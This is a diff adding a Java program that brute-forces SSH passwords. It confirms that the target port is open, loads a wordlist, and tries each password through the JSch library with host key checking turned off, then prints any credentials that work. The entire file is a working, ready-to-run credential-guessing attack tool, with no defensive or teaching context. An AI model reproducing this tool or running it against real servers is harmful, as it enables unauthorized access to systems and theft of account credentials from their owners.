@@ -1,0 +1,115 @@
+package sshbrute;
+
+import java.net.Socket; 
+import java.net.InetSocketAddress; 
+
+import java.util.ArrayList; 
+import java.io.FileReader; 
+import java.io.BufferedReader; 
+
+//Obsure import that is used for the 
+import com.jcraft.Jsch.*; 
+
+
+
+public class SSHBrute {
+
+    public static void checkHost(String host, int port) {
+        //This trys to get get the connected 
+            try{
+                System.out.print("checking host...");
+                Socket checkSock; 
+                checkSock = new Socket();
+                //Connects to an internet socket address using the hostbanem and port
+                // timeout of 1000 
+                checkSock.connect(new InetSocketAddress(host,port), 1000); 
+                checkSock.close(); 
+                System.out.println("Successful");
+                
+            } catch (Exception e ){  //failure to connect to the ssh server 
+                   System.out.println("Fail");
+                   System.exit(1); 
+            
+            }
+    }
+    
+    //This gets the file path of the wordlist needed for the attack 
+    //The word list is any size 
+    public static ArrayList<String> getwordList (String path){
+     
+         //Description of what is being done for user to see 
+        System.out.println("read Wordlist");
+
+        ArrayList<String> wordList; 
+       wordList = new ArrayList<>(); 
+        try{
+            
+            //opens a buffer to read the lines in the file specififed 
+            BufferedReader buffRead = new BufferedReader(new FileReader(path));
+            String line = null; 
+            
+            //Adds the lines of the file to the arraylist until the file is complete. IF the file is empty then it iwll fail. 
+            while((line = buffRead.readLine()) != null){
+                wordList.add(line);
+            }
+            buffRead.close(); 
+            System.out.println("Done");
+        } 
+        catch (Exception e){ //failed to read the wordlist
+         System.out.println("Fail");
+         System.exit(1); 
+        } 
+        return wordList;
+    }
+    
+    //Mostly used from the open source JSchDeveloper Website and just modified it to log into our ssh 
+    //http://www.jcraft.com/jsch/examples/Shell.java.html
+    
+    public static boolean crackPass(String host, String user, String pass, int port){
+        try{
+            Session tryPass = new JSch().getSession(user, host, port); 
+            tryPass.setPassword(pass);
+            tryPass.setConfig("StrictHostKeyChecking", "no");
+            tryPass.connect(30000);
+            tryPass.disconnect(); 
+        }
+        catch(Exception e) {
+               return false; 
+        }
+        return true; 
+    }
+    
+    public static void main(String[] args) {
+        if(args.length != 3){
+            System.out.println("usage: ./sshbrute.jar {TARGET [:PORT]] [USERNAME] [WORDLIST]");
+                System.exit(1);
+        }
+        String targetIP; 
+        int targetPort;
+        
+        //do we have the arguments? If we do then use it else we should use the basic configuration of java 
+        if(args[0].contains(":")){
+            targetIP = args[0].split(":")[0];
+            targetPort = Integer.parseInt(args[0].split(":")[1]);
+        } else {
+            targetIP = args[0];
+            targetPort = 22;  //Ssh is usually port 22 unless you want to be "Secure" 
+        }
+        
+        checkHost(targetIP, targetPort); 
+        String user = args[1]; 
+        ArrayList<String> wordList; 
+        wordList = getwordList(args[2]);
+        System.out.println(String.format("cracking SSH password for \"%s\" at %s...\n", user, targetIP));
+        for(int i =0; i< wordList.size(); i++){
+            if( crackPass(targetIP, user, wordList.get(i), targetPort) ){
+                System.out.println("Creds found: ");
+                System.out.print(String.format("\tuser: %s",user));
+                System.out.println(String.format("\tpass: %s", wordList.get(i)));
+                System.exit(0); 
+                
+            }
+        }
+        System.out.println("Bruteforce Failed");
+    }
+}
